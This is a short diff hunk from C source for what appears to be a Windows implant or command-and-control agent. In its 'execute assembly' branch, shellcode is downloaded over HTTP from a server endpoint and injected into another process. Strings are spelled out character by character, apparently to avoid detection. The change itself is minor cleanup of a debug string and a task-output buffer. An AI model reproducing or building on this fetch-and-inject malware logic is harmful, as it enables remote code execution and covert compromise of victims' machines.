@@ -421,10 +421,8 @@ void myMain()
             DWORD dwShellcodeSize;
             WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
             LPVOID shellcode = httpGetExecutable(api, &dwShellcodeSize, cAssemblyEndpoint, wServer, port);
-            CHAR hi[] = {'S', 'i', 'z', 'e', ':', ' ', '%', 'd', 0};
             ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
-            CHAR buf[] = { 'E', 'x', 'e', 'c', 'u', 't', 'e', 'A', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 };
-            taskOutput = (CHAR*)buf;
+            taskOutput = executeAssembly;
         }
         else
         {
